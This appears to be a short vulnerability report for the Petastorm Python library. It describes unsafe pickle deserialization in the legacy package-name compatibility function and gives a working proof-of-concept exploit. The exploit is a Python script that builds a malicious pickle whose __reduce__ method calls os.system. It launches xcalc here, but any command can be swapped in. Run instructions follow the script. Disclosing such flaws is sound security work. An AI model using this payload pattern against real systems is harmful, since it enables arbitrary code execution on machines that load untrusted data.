# Description
Petastorm is an open source data access library developed at Uber ATG. This library enables single machine or distributed training and evaluation of deep learning models directly from datasets in Apache Parquet format. Petastorm supports popular Python-based machine learning (ML) frameworks such as Tensorflow, PyTorch, and PySpark. It can also be used from pure Python code.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```python
import os
import pickle
#os.system('pip3 install petastorm')
from petastorm.etl import legacy
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#Exploiting
dumps = pickle.dumps(ArbitraryCode())
legacy.depickle_legacy_package_name_compatible(dumps)
```
* `pip3 install petastorm`
* `python3 exploit.py`
